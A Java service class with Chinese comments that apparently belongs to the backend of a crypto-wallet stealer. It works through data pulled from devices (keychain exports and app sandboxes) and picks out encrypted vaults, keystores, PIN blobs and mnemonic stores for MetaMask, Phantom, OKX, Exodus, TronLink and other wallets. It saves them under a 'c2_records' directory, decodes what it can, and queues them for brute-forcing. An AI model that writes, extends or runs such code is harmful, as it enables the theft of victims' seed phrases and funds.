package com.consumer.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.consumer.config.ConsumerProperties;
import com.consumer.dao.DecryptTaskDao;
import com.consumer.entity.DecryptTaskEntity;

import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;
import java.util.stream.Stream;

/**
 * 旁路：把「本次未能明文解出」的钱包加密材料落盘，并在 waitbound 记录路径。
 * <p>
 * 不参与助记词解密 / mnemonic 入库 / news4 派生；失败只打日志，不影响主流程。
 * Trust 不收集。hex_content 存磁盘绝对路径，不存密文内容。
 * <p>
 * <b>一钱包一条</b>：同 device+wallet 只保留优先级最高的一份「可爆破」材料；
 * 落盘时能解析的一并写出可读 sidecar（.preview.json 等），密文载荷本身不做伪解密。
 */
@Service
@Slf4j
public class EncryptedWalletArtifactCollector {

    /** 单文件上限（过大跳过） */
    private static final int MAX_CONTENT_BYTES = 512 * 1024;

    private static final char[] HEX = "0123456789abcdef".toCharArray();

    private static final Pattern B64_LINE = Pattern.compile("^[A-Za-z0-9+/=\\r\\n]+$");

    /**
     * 材料种类（内部用，用于优先级/文件名；入库的 encrypt_type 是算法名）。
     * 越高越像「真正可爆破」的入口文件。
     */
    private static final Map<String, Integer> KIND_PRIORITY = new HashMap<>();
    static {
        KIND_PRIORITY.put("metamask_vault_backup", 100);
        KIND_PRIORITY.put("metamask_keyring_controller", 90);
        KIND_PRIORITY.put("solflare_passcode_vault", 100);
        KIND_PRIORITY.put("solflare_default_encrypted", 85);
        KIND_PRIORITY.put("solflare_sandbox", 40);
        KIND_PRIORITY.put("tonkeeper_encrypted_chunk", 100);
        KIND_PRIORITY.put("tonkeeper_sandbox", 40);
        KIND_PRIORITY.put("mytonwallet_secret", 100);
        KIND_PRIORITY.put("mytonwallet_sandbox", 40);
        KIND_PRIORITY.put("okx_se_ptc", 100);
        KIND_PRIORITY.put("okx_sandbox_plist", 35);
        KIND_PRIORITY.put("phantom_vault_seed", 100);
        KIND_PRIORITY.put("uniswap_private_key", 100);
        KIND_PRIORITY.put("uniswap_mnemonic_blob", 90);
        KIND_PRIORITY.put("exodus_unused_data", 100);
        KIND_PRIORITY.put("tronlink_keystore", 100);
        KIND_PRIORITY.put("tronlink_hdwallet", 80);
        KIND_PRIORITY.put("bitget_pin_or_mnemonic_key", 100);
        KIND_PRIORITY.put("bitget_config_wallet", 35);
        KIND_PRIORITY.put("coin98_mmkv_enc", 100);
        KIND_PRIORITY.put("tonhub_mmkv", 100);
        KIND_PRIORITY.put("imtoken_als", 50);
        KIND_PRIORITY.put("tokenpocket_f4secyr", 100);
    }

    @Resource
    private DecryptTaskDao decryptTaskDao;
    @Resource
    private ConsumerProperties consumerProps;

    /**
     * @param unpackDir        war 解压目录（含 files/hex、files/sandbox）
     * @param deviceId         设备号
     * @param ios18paramId     ios18param 主键
     * @param decryptedWallets 本次已成功解出助记词的钱包名（小写），这些钱包跳过收集
     */
    public int collectAndSave(String unpackDir, String deviceId, Integer ios18paramId,
                              Set<String> decryptedWallets) {
        if (unpackDir == null || unpackDir.trim().isEmpty()) {
            return 0;
        }
        Path root = Paths.get(unpackDir.trim());
        if (!Files.isDirectory(root)) {
            return 0;
        }
        Set<String> skip = new HashSet<>();
        // Trust 永不进 waitbound
        skip.add("trust");
        skip.add("trustwallet");
        skip.add("trust_wallet");
        if (decryptedWallets != null) {
            for (String w : decryptedWallets) {
                if (w != null && !w.isEmpty()) {
                    skip.add(w.toLowerCase(Locale.ROOT));
                }
            }
        }

        List<Artifact> arts = new ArrayList<>();
        try {
            Path hex = root.resolve("files").resolve("hex");
            Path sandbox = root.resolve("files").resolve("sandbox");
            if (Files.isDirectory(hex)) {
                collectHex(hex, skip, arts);
            }
            if (Files.isDirectory(sandbox)) {
                collectSandbox(sandbox, skip, arts);
            }
        } catch (Throwable t) {
            log.warn("【waitbound】扫描加密材料失败 device={} err={}", deviceId, t.toString());
            return 0;
        }

        if (arts.isEmpty()) {
            return 0;
        }

        // 按钱包收敛：每钱包只留优先级最高的一份
        Map<String, Artifact> bestByWallet = new LinkedHashMap<>();
        for (Artifact a : arts) {
            if (a == null || a.wallet == null || a.wallet.isEmpty()) continue;
            String key = a.wallet.toLowerCase(Locale.ROOT);
            Artifact cur = bestByWallet.get(key);
            if (cur == null || score(a) > score(cur)) {
                bestByWallet.put(key, a);
            }
        }

        String safeDevice = sanitizePathPart(deviceId == null || deviceId.isEmpty() ? "unknown" : deviceId);
        Path baseDir = resolveWaitboundBase().resolve(safeDevice);
        double now = System.currentTimeMillis() / 1000.0;
        int inserted = 0;
        for (Artifact a : bestByWallet.values()) {
            try {
                Integer exist = decryptTaskDao.findIdByDeviceWallet(
                        deviceId == null ? "" : deviceId, a.wallet);
                if (exist != null) {
                    continue;
                }

                String hash = shortHash(a.contentBytes);
                Path diskPath = writeToDisk(baseDir, a.wallet, a.sourceFile, a.contentBytes, hash, a.artifactKind);
                if (diskPath == null) {
                    continue;
                }
                try {
                    writeNormalizedSidecar(diskPath, a.contentBytes);
                } catch (Throwable ignore) {}

                String pathStr = diskPath.toAbsolutePath().normalize().toString().replace('\\', '/');

                DecryptTaskEntity e = new DecryptTaskEntity();
                e.setDeviceId(deviceId == null ? "" : deviceId);
                e.setRowId(ios18paramId);
                e.setWalletName(a.wallet);
                e.setHexType(a.hexType);
                e.setHexContent(pathStr);
                // 入库算法名（AES / CryptoJS-AES / …），不是材料标签
                e.setEncryptType(a.encryptAlgo);
                e.setResult("");
                e.setStatus(0);
                e.setSetTime(now);
                e.setUpdateTime(now);
                decryptTaskDao.insert(e);
                inserted++;
            } catch (Throwable t) {
                log.warn("【waitbound】写入跳过 wallet={} kind={} algo={} err={}",
                        a.wallet, a.artifactKind, a.encryptAlgo, t.toString());
            }
        }
        if (inserted > 0 || !bestByWallet.isEmpty()) {
            log.info("【waitbound】待爆破材料入库 count={} wallets={} scanned={} device={} dir={}",
                    inserted, bestByWallet.size(), arts.size(), deviceId, baseDir.toAbsolutePath());
        }
        return inserted;
    }

    /** 越高越优先作为该钱包唯一落盘条目 */
    private static int score(Artifact a) {
        int base = KIND_PRIORITY.getOrDefault(a.artifactKind, 10);
        if (a.sourceFile != null) {
            String p = a.sourceFile.toString().replace('\\', '/').toLowerCase(Locale.ROOT);
            if (p.contains("/files/hex/")) {
                base += 5; // hex 钥匙串导出通常比 sandbox 杂文件更接近密文入口
            }
        }
        if (a.contentBytes != null && a.contentBytes.length > 0) {
            base += Math.min(8, a.contentBytes.length / 8192);
        }
        return base;
    }

    /**
     * 推断入库用的加密算法名。
     * 优先看内容指纹，再按材料种类回落钱包常见方案。
     */
    static String resolveEncryptAlgo(String artifactKind, byte[] content) {
        String sniffed = sniffEncryptAlgo(content);
        if (sniffed != null) {
            return sniffed;
        }
        String kind = artifactKind == null ? "" : artifactKind.toLowerCase(Locale.ROOT);
        if (kind.startsWith("metamask")) {
            return "PBKDF2+AES"; // browser-passworder / vault
        }
        if (kind.startsWith("coin98")) {
            return "CryptoJS-AES";
        }
        if (kind.contains("keystore") || kind.contains("tronlink_keystore")) {
            return "scrypt+AES-128-CTR";
        }
        if (kind.startsWith("tonhub")) {
            return "PBKDF2-SHA512+NaCl-secretbox";
        }
        if (kind.startsWith("solflare") || kind.startsWith("bitget")) {
            return "PIN+AES";
        }
        if (kind.startsWith("phantom") || kind.startsWith("tonkeeper")
                || kind.startsWith("okx") || kind.startsWith("tokenpocket")
                || kind.startsWith("imtoken") || kind.startsWith("mytonwallet")) {
            return "AES";
        }
        if (kind.startsWith("uniswap") || kind.startsWith("exodus")) {
            return "unknown"; // 常见为明文 JSON，算法不确定
        }
        return "unknown";
    }

    /** 从内容嗅探常见加密信封 */
    private static String sniffEncryptAlgo(byte[] content) {
        if (content == null || content.length < 8) {
            return null;
        }
        // CryptoJS OpenSSL Salted__
        if (content.length >= 8
                && content[0] == 'S' && content[1] == 'a' && content[2] == 'l'
                && content[3] == 't' && content[4] == 'e' && content[5] == 'd'
                && content[6] == '_' && content[7] == '_') {
            return "CryptoJS-AES";
        }
        String text = tryUtf8Text(content);
        if (text == null) {
            if (startsWithAscii(content, "bplist")) {
                return "bplist-blob";
            }
            return null;
        }
        String t = text.trim();
        if (t.startsWith("U2FsdGVk")) {
            return "CryptoJS-AES"; // Base64(Salted__)
        }
        String lower = t.toLowerCase(Locale.ROOT);
        // Ethereum / Trust / TronLink keystore V3
        if (lower.contains("\"crypto\"") && lower.contains("ciphertext")
                && (lower.contains("\"scrypt\"") || lower.contains("\"pbkdf2\""))) {
            if (lower.contains("scrypt")) {
                return "scrypt+AES-128-CTR";
            }
            return "PBKDF2+AES-128-CTR";
        }
        if (lower.contains("\"iv\"") && (lower.contains("\"data\"") || lower.contains("\"ciphertext\""))
                && (lower.contains("\"salt\"") || lower.contains("\"keymetadata\""))) {
            return "PBKDF2+AES";
        }
        return null;
    }

    /** {waitbound-dir}/{deviceId}/{wallet}/... */
    private Path resolveWaitboundBase() {
        String dir = consumerProps.getWaitboundDir();
        if (dir == null || dir.trim().isEmpty()) {
            dir = "D:/c2_records/waitbound";
        }
        return Paths.get(dir.trim());
    }

    private Path writeToDisk(Path deviceBase, String wallet, Path sourceFile,
                             byte[] content, String hash, String artifactKind) throws IOException {
        String safeWallet = sanitizePathPart(wallet);
        Path walletDir = deviceBase.resolve(safeWallet);
        Files.createDirectories(walletDir);

        // 稳定文件名：一钱包一份主材料；kind 仅用于文件名，不入库
        String kindPart = sanitizeFileName(artifactKind == null ? "blob" : artifactKind);
        String fileName = "payload_" + kindPart + "_"
                + hash.substring(0, Math.min(8, hash.length()));
        if (sourceFile != null) {
            String orig = sourceFile.getFileName().toString();
            int dot = orig.lastIndexOf('.');
            if (dot > 0 && dot < orig.length() - 1) {
                fileName += orig.substring(dot).toLowerCase(Locale.ROOT);
            } else {
                fileName += ".bin";
            }
        } else {
            fileName += ".bin";
        }
        fileName = sanitizeFileName(fileName);
        Path dest = walletDir.resolve(fileName);
        if (!Files.exists(dest)) {
            if (sourceFile != null && Files.isRegularFile(sourceFile)) {
                Files.copy(sourceFile, dest, StandardCopyOption.REPLACE_EXISTING);
            } else {
                Files.write(dest, content);
            }
        }
        return dest;
    }

    /**
     * 落盘旁路解析：能读懂的写成 sidecar，密文仍保留原文件。
     * <ul>
     *   <li>JSON → .pretty.json + .preview.json（标注加密字段）</li>
     *   <li>XML plist → .xml（可读文本）+ .preview.json</li>
     *   <li>bplist → .preview.json（meta + 可提取 ASCII 串）</li>
     *   <li>纯 base64 文本 → .decoded.txt / 再尝试 JSON</li>
     * </ul>
     */
    void writeNormalizedSidecar(Path dest, byte[] content) throws IOException {
        if (dest == null || content == null || content.length == 0) return;
        Path previewPath = Paths.get(dest.toString() + ".preview.json");
        if (Files.exists(previewPath)) return;

        Map<String, Object> preview = new LinkedHashMap<>();
        preview.put("source", dest.getFileName().toString());
        preview.put("size", content.length);

        // binary plist
        if (content.length >= 8 && startsWithAscii(content, "bplist")) {
            preview.put("format", "bplist");
            preview.put("note", "binary plist; ciphertext/keys may be nested; original file kept");
            List<String> strings = extractAsciiStrings(content, 4, 200);
            if (!strings.isEmpty()) {
                preview.put("ascii_strings", strings.size() > 80 ? strings.subList(0, 80) : strings);
            }
            writeJson(previewPath, preview);
            return;
        }

        String text = tryUtf8Text(content);
        if (text == null) {
            preview.put("format", "binary");
            preview.put("note", "non-text blob; original kept");
            List<String> strings = extractAsciiStrings(content, 6, 120);
            if (!strings.isEmpty()) {
                preview.put("ascii_strings", strings.size() > 40 ? strings.subList(0, 40) : strings);
            }
            writeJson(previewPath, preview);
            return;
        }

        String trimmed = text.trim();
        // XML plist
        if (trimmed.startsWith("<?xml") || trimmed.contains("<plist")) {
            preview.put("format", "xml_plist");
            Path xmlSide = Paths.get(dest.toString() + ".xml");
            if (!Files.exists(xmlSide)) {
                Files.write(xmlSide, trimmed.getBytes(StandardCharsets.UTF_8));
            }
            preview.put("sidecar", xmlSide.getFileName().toString());
            preview.put("note", "xml plist copied to .xml; may still contain encrypted values");
            writeJson(previewPath, preview);
            return;
        }

        // JSON
        if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
            preview.put("format", "json");
            try {
                Object parsed = JSON.parse(trimmed);
                Path pretty = Paths.get(dest.toString() + ".pretty.json");
                if (!Files.exists(pretty)) {
                    Files.write(pretty, JSON.toJSONString(parsed, SerializerFeature.PrettyFormat)
                            .getBytes(StandardCharsets.UTF_8));
                }
                preview.put("sidecar", pretty.getFileName().toString());
                if (parsed instanceof JSONObject) {
                    JSONObject jo = (JSONObject) parsed;
                    List<String> encHints = new ArrayList<>();
                    for (String k : jo.keySet()) {
                        String lk = k.toLowerCase(Locale.ROOT);
                        if (lk.contains("data") || lk.contains("cipher") || lk.contains("vault")
                                || lk.contains("encrypt") || lk.equals("iv") || lk.equals("salt")
                                || lk.contains("mnemonic") || lk.contains("seed") || lk.contains("key")) {
                            Object v = jo.get(k);
                            String vs = v == null ? "" : String.valueOf(v);
                            encHints.add(k + ":" + (vs.length() > 64 ? vs.substring(0, 64) + "…" : vs));
                        }
                    }
                    if (!encHints.isEmpty()) {
                        preview.put("interesting_fields", encHints);
                        preview.put("note", "json pretty-printed; interesting fields may still be ciphertext");
                    } else {
                        preview.put("note", "json pretty-printed");
                    }
                } else {
                    preview.put("note", "json pretty-printed");
                }
            } catch (Exception e) {
                preview.put("note", "looks like json but parse failed: " + e.getMessage());
            }
            writeJson(previewPath, preview);
            return;
        }

        // base64-looking text
        String compact = trimmed.replaceAll("\\s+", "");
        if (compact.length() >= 16 && compact.length() % 4 == 0 && B64_LINE.matcher(compact).matches()) {
            preview.put("format", "base64_text");
            try {
                byte[] decoded = Base64.getDecoder().decode(compact);
                preview.put("decoded_size", decoded.length);
                Path decodedPath = Paths.get(dest.toString() + ".decoded.bin");
                if (!Files.exists(decodedPath)) {
                    Files.write(decodedPath, decoded);
                }
                preview.put("sidecar_bin", decodedPath.getFileName().toString());
                String inner = tryUtf8Text(decoded);
                if (inner != null) {
                    String it = inner.trim();
                    Path txt = Paths.get(dest.toString() + ".decoded.txt");
                    if (!Files.exists(txt)) {
                        Files.write(txt, it.getBytes(StandardCharsets.UTF_8));
                    }
                    preview.put("sidecar_txt", txt.getFileName().toString());
                    if (it.startsWith("{") || it.startsWith("[")) {
                        try {
                            Object parsed = JSON.parse(it);
                            Path pretty = Paths.get(dest.toString() + ".decoded.pretty.json");
                            if (!Files.exists(pretty)) {
                                Files.write(pretty, JSON.toJSONString(parsed, SerializerFeature.PrettyFormat)
                                        .getBytes(StandardCharsets.UTF_8));
                            }
                            preview.put("sidecar_json", pretty.getFileName().toString());
                        } catch (Exception ignore) {}
                    }
                    if (decoded.length >= 8 && startsWithAscii(decoded, "bplist")) {
                        preview.put("decoded_format", "bplist");
                        List<String> strings = extractAsciiStrings(decoded, 4, 200);
                        if (!strings.isEmpty()) {
                            preview.put("ascii_strings",
                                    strings.size() > 80 ? strings.subList(0, 80) : strings);
                        }
                    }
                } else if (decoded.length >= 8 && startsWithAscii(decoded, "bplist")) {
                    preview.put("decoded_format", "bplist");
                    List<String> strings = extractAsciiStrings(decoded, 4, 200);
                    if (!strings.isEmpty()) {
                        preview.put("ascii_strings",
                                strings.size() > 80 ? strings.subList(0, 80) : strings);
                    }
                }
                preview.put("note", "base64 decoded sidecar written; may still be ciphertext");
            } catch (Exception e) {
                preview.put("note", "base64-looking but decode failed: " + e.getMessage());
            }
            writeJson(previewPath, preview);
            return;
        }

        // plain text fallback
        preview.put("format", "text");
        preview.put("note", "utf-8 text; original kept");
        preview.put("head", trimmed.length() > 500 ? trimmed.substring(0, 500) + "…" : trimmed);
        writeJson(previewPath, preview);
    }

    private static void writeJson(Path path, Map<String, Object> obj) throws IOException {
        Files.write(path, JSON.toJSONString(obj, SerializerFeature.PrettyFormat)
                .getBytes(StandardCharsets.UTF_8));
    }

    private static boolean startsWithAscii(byte[] data, String s) {
        if (data == null || s == null || data.length < s.length()) return false;
        for (int i = 0; i < s.length(); i++) {
            if ((data[i] & 0xFF) != (s.charAt(i) & 0xFF)) return false;
        }
        return true;
    }

    /** 可打印 UTF-8 文本；含过多控制字符则视为二进制 */
    private static String tryUtf8Text(byte[] data) {
        if (data == null || data.length == 0) return null;
        int sample = Math.min(data.length, 4096);
        int ctrl = 0;
        for (int i = 0; i < sample; i++) {
            int b = data[i] & 0xFF;
            if (b == 0) return null;
            if (b < 0x09 || (b > 0x0D && b < 0x20 && b != 0x1B)) ctrl++;
        }
        if (ctrl * 20 > sample) return null;
        try {
            return new String(data, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    /** 从二进制中提取可打印 ASCII 串（便于 bplist/blob 人工查看） */
    private static List<String> extractAsciiStrings(byte[] data, int minLen, int maxCount) {
        LinkedHashSet<String> set = new LinkedHashSet<>();
        StringBuilder sb = new StringBuilder();
        for (byte value : data) {
            int b = value & 0xFF;
            if (b >= 0x20 && b < 0x7F) {
                sb.append((char) b);
            } else {
                if (sb.length() >= minLen) {
                    set.add(sb.toString());
                    if (set.size() >= maxCount) break;
                }
                sb.setLength(0);
            }
        }
        if (sb.length() >= minLen && set.size() < maxCount) {
            set.add(sb.toString());
        }
        return new ArrayList<>(set);
    }

    // ------------------------------------------------------------------ hex

    private void collectHex(Path hex, Set<String> skip, List<Artifact> out) throws IOException {
        if (!skip.contains("metamask")) {
            addMatching(hex.resolve("metamask"), "metamask", "mnemonic", "metamask_vault_backup",
                    name -> name.contains("vault_backup"), out);
        }
        if (!skip.contains("solflare")) {
            Path d = hex.resolve("solflare");
            addMatching(d, "solflare", "mnemonic", "solflare_default_encrypted",
                    name -> name.contains("default_encrypted"), out);
            addMatching(d, "solflare", "mnemonic", "solflare_passcode_vault",
                    name -> name.contains("passcode_vault"), out);
        }
        if (!skip.contains("tonkeeper")) {
            addMatching(hex.resolve("tonkeeper"), "tonkeeper", "mnemonic", "tonkeeper_encrypted_chunk",
                    name -> name.contains("encrypted_chunk"), out);
        }
        if (!skip.contains("mytonwallet")) {
            addMatching(hex.resolve("mytonwallet"), "mytonwallet", "mnemonic", "mytonwallet_secret",
                    name -> name.startsWith("secret_") || name.contains("secret_0"), out);
        }
        if (!skip.contains("okx")) {
            addMatching(hex.resolve("okx"), "okx", "mnemonic", "okx_se_ptc",
                    name -> name.contains("se-ptc") || name.contains("encrypted"), out);
        }
        if (!skip.contains("phantom")) {
            addMatching(hex.resolve("phantom"), "phantom", "mnemonic", "phantom_vault_seed",
                    name -> name.contains("7661756c742e73656564")
                            || name.contains("vault") || name.contains("seed") || name.endsWith(".json"), out);
        }
        // trust：明确不收集
        if (!skip.contains("uniswap")) {
            addMatching(hex.resolve("uniswap"), "uniswap", "private_key", "uniswap_private_key",
                    name -> name.contains("privatekey"), out);
            addMatching(hex.resolve("uniswap"), "uniswap", "mnemonic", "uniswap_mnemonic_blob",
                    name -> name.contains("mnemonic"), out);
        }
        if (!skip.contains("exodus")) {
            addMatching(hex.resolve("exodus"), "exodus", "mnemonic", "exodus_unused_data",
                    name -> name.contains("unused_data") || name.contains("seed") || name.contains("mnemonic"), out);
        }
        if (!skip.contains("tronlink")) {
            addMatching(hex.resolve("tronlink"), "tronlink", "mnemonic", "tronlink_hdwallet",
                    name -> name.contains("hdwallet") || name.contains("tronlink"), out);
        }
        if (!skip.contains("bitget")) {
            addMatching(hex.resolve("bitget"), "bitget", "mnemonic", "bitget_pin_or_mnemonic_key",
                    name -> (name.contains("mnemonic") || name.contains("pin") || name.contains("password"))
                            && !name.endsWith(".txt"), out);
        }
    }

    // ------------------------------------------------------------------ sandbox

    private void collectSandbox(Path sandbox, Set<String> skip, List<Artifact> out) throws IOException {
        if (!skip.contains("metamask")) {
            addMatching(sandbox.resolve("metamask"), "metamask", "mnemonic", "metamask_keyring_controller",
                    name -> name.contains("keyringcontroller"), out);
        }
        if (!skip.contains("tronlink")) {
            addMatching(sandbox.resolve("tronlink"), "tronlink", "mnemonic", "tronlink_keystore",
                    name -> name.contains("utc--"), out);
        }
        // trust：不收集
        if (!skip.contains("coin98")) {
            addMatching(sandbox.resolve("coin98"), "coin98", "mnemonic", "coin98_mmkv_enc",
                    name -> name.equals("mmkv.default.enc") || name.endsWith(".enc"), out);
        }
        if (!skip.contains("tonhub")) {
            addMatching(sandbox.resolve("tonhub"), "tonhub", "mnemonic", "tonhub_mmkv",
                    name -> name.equals("mmkv.default") || name.startsWith("mmkv."), out);
            addMatching(sandbox.resolve("ton_wallet"), "tonhub", "mnemonic", "tonhub_mmkv",
                    name -> name.equals("mmkv.default") || name.startsWith("mmkv."), out);
        }
        if (!skip.contains("tonkeeper")) {
            addMatching(sandbox.resolve("tonkeeper"), "tonkeeper", "mnemonic", "tonkeeper_sandbox",
                    name -> name.contains("mmkv") || name.contains("encrypt") || name.endsWith(".plist"), out);
        }
        if (!skip.contains("okx")) {
            addMatchingDeep(sandbox.resolve("okx"), "okx", "mnemonic", "okx_sandbox_plist",
                    name -> name.endsWith(".plist"), 3, out);
        }
        if (!skip.contains("bitget")) {
            addMatchingDeep(sandbox.resolve("bitget"), "bitget", "mnemonic", "bitget_config_wallet",
                    name -> name.contains("kconfigwallet") || name.contains("wallet"), 4, out);
        }
        if (!skip.contains("imtoken")) {
            addMatchingDeep(sandbox.resolve("imtoken"), "imtoken", "mnemonic", "imtoken_als",
                    name -> !name.contains("realm") && !name.equals("manifest.json")
                            && (name.endsWith(".json") || name.matches("[0-9a-f]{32}")), 4, out);
        }
        if (!skip.contains("tokenpocket")) {
            Path f4 = sandbox.resolve("tokenpocket").resolve("Documents").resolve("F4SeCyr");
            addMatching(f4, "tokenpocket", "mnemonic", "tokenpocket_f4secyr", name -> true, out);
        }
        if (!skip.contains("mytonwallet")) {
            addMatching(sandbox.resolve("mytonwallet"), "mytonwallet", "mnemonic", "mytonwallet_sandbox",
                    name -> name.contains("secret") || name.contains("enclave") || name.endsWith(".plist"), out);
        }
        if (!skip.contains("solflare")) {
            addMatching(sandbox.resolve("solflare"), "solflare", "mnemonic", "solflare_sandbox",
                    name -> name.endsWith(".plist") || name.contains("encrypt"), out);
        }
    }

    // ------------------------------------------------------------------ helpers

    private interface NamePred {
        boolean test(String lowerName);
    }

    private void addMatching(Path dir, String wallet, String hexType, String artifactKind,
                             NamePred pred, List<Artifact> out) throws IOException {
        addMatchingDeep(dir, wallet, hexType, artifactKind, pred, 2, out);
    }

    private void addMatchingDeep(Path dir, String wallet, String hexType, String artifactKind,
                                 NamePred pred, int maxDepth, List<Artifact> out) throws IOException {
        if (dir == null || !Files.isDirectory(dir)) {
            return;
        }
        try (Stream<Path> walk = Files.walk(dir, Math.max(1, maxDepth))) {
            walk.filter(Files::isRegularFile).forEach(p -> {
                String name = p.getFileName().toString();
                String lower = name.toLowerCase(Locale.ROOT);
                if (lower.endsWith(".txt") && Files.exists(Paths.get(p.toString().replaceAll("\\.txt$", "")))) {
                    return;
                }
                if (lower.endsWith(".crc")) {
                    return;
                }
                if (!pred.test(lower)) {
                    return;
                }
                addFile(p, wallet, hexType, artifactKind, out);
            });
        }
    }

    private void addFile(Path file, String wallet, String hexType, String artifactKind, List<Artifact> out) {
        try {
            long size = Files.size(file);
            if (size <= 0 || size > MAX_CONTENT_BYTES) {
                if (size > MAX_CONTENT_BYTES) {
                    log.debug("【waitbound】文件过大跳过 wallet={} file={} size={}", wallet, file.getFileName(), size);
                }
                return;
            }
            byte[] raw = Files.readAllBytes(file);
            if (raw.length == 0) {
                return;
            }
            Artifact a = new Artifact();
            a.wallet = wallet;
            a.hexType = hexType;
            a.artifactKind = artifactKind;
            a.encryptAlgo = resolveEncryptAlgo(artifactKind, raw);
            a.contentBytes = raw;
            a.sourceFile = file;
            out.add(a);
        } catch (Exception e) {
            log.debug("【waitbound】读文件失败 file={} err={}", file, e.toString());
        }
    }

    private static String sanitizePathPart(String s) {
        if (s == null || s.isEmpty()) {
            return "unknown";
        }
        return s.replaceAll("[^a-zA-Z0-9._\\-]", "_");
    }

    private static String sanitizeFileName(String s) {
        if (s == null || s.isEmpty()) {
            return "blob.bin";
        }
        String n = s.replaceAll("[^a-zA-Z0-9._\\-]", "_");
        if (n.length() > 120) {
            int dot = n.lastIndexOf('.');
            String ext = dot > 0 ? n.substring(dot) : "";
            n = n.substring(0, 120 - ext.length()) + ext;
        }
        return n;
    }

    private static String shortHash(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(data);
            StringBuilder sb = new StringBuilder(16);
            for (int i = 0; i < 8; i++) {
                int v = d[i] & 0xFF;
                sb.append(HEX[v >>> 4]).append(HEX[v & 0x0F]);
            }
            return sb.toString();
        } catch (Exception e) {
            return Integer.toHexString(data.length);
        }
    }

    private static final class Artifact {
        String wallet;
        String hexType;       // mnemonic / private_key
        String artifactKind;  // 材料标签（仅优先级/文件名）
        String encryptAlgo;   // 入库 encrypt_type：AES / CryptoJS-AES / …
        byte[] contentBytes;
        Path sourceFile;
    }
}
